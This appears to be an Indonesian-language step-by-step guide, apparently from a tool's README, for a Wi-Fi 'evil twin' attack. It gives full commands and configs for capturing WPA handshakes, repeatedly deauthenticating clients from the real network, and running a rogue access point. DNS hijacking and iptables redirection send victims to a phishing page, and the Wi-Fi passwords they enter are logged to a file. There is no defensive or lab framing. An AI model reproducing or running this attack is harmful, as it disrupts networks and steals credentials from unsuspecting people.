# Evil Twin Attack

## Instal Tools

```
apt-get update
apt-get install aircrack-ng hostapd dnsmasq iptables apache2 php libapache2-mod-php
```

## Langkah-Langkah

#### 1. Aktifkan Mode Monitor

```
airmon-ng check kill
airmon-ng start [interface_deauth]
```

#### 2. Scan Wi-Fi WPA/WPA2-PSK

```
airodump-ng --encrypt wpa [interface_deauth]
```

#### 3. Capture Handshake

```
airodump-ng --bssid [bssid] --channel [channel] --write [output] [interface_deauth]
```

#### 4. Jalankan Deauth Attack

```
aireplay-ng -0 10 -a [bssid] [interface_deauth]
```

#### 5. Konfigurasi IP

```
ip addr flush dev [interface_ap]
ip addr add 10.10.10.1/24 dev [interface_ap]
ip link set [interface_ap] up
```

#### 6. Konfigurasi Hostapd

```
nano hostapd.conf
```

Isi dengan:

```
interface=[interface_ap]
driver=nl80211
ssid=[ssid]
hw_mode=g
channel=[channel]
auth_algs=1
ignore_broadcast_ssid=0
```

#### 7. Konfigurasi DNSmasq

```
nano dnsmasq.conf
```

Isi dengan:

```
interface=[interface_ap]
dhcp-range=10.10.10.2,10.10.10.10,255.255.255.0,12h
dhcp-option=3,10.10.10.1
dhcp-option=6,10.10.10.1
address=/#/10.10.10.1
no-resolv
log-dhcp
```

#### 8. Konfigurasi iptables

```
iptables -F
iptables -t nat -F
iptables -X
iptables -t nat -A PREROUTING -i [interface_ap] -p tcp --dport 80 -j DNAT --to-destination 10.10.10.1:80
iptables -t nat -A PREROUTING -i [interface_ap] -p udp --dport 53 -j DNAT --to-destination 10.10.10.1:53
iptables -A INPUT -i [interface_ap] -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -i [interface_ap] -p udp --dport 53 -j ACCEPT
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -t nat -L -n -v
```

#### 9. Backup Direktori Web

```
mkdir /var/www/html/backup
mv /var/www/html/* /var/www/html/backup
```

#### 10. Setup File Web

```
cp conf/index.html /var/www/html
cp conf/verifikasi.php /var/www/html
```

> [!NOTE]
> File `verifikasi.php` harus disesuaikan nilai variabelnya dengan target.

#### 11. Setup File Capture

```
cp [output]-01.cap /var/www/html/
chown root:www-data /var/www/html/[output]-01.cap
chmod 640 /var/www/html/[output]-01.cap
```

#### 12. Setup File Password

```
touch /var/www/html/passwords.txt
chmod 660 /var/www/html/passwords.txt
chown -R www-data:www-data /var/www/html
```

#### 13. Konfigurasi Apache

```
cp /etc/apache2/sites-available/000-default.conf /etc/apache2/sites-available/000-default.conf.bak
cp conf/apache2.conf /etc/apache2/sites-available/000-default.conf
```

#### 14. Aktifkan Apache Rewrite

```
a2enmod rewrite
systemctl restart apache2
```

#### 15. Jalankan DNSmasq

```
dnsmasq -C dnsmasq.conf -d
```

#### 16. Jalankan Hostapd

```
hostapd hostapd.conf
```

#### 17. Monitoring Password

```
tail -f /var/www/html/passwords.txt
```

#### 18. Jalankan Deauth Attack

```
aireplay-ng -0 0 -a [bssid] [interface_deauth]
```
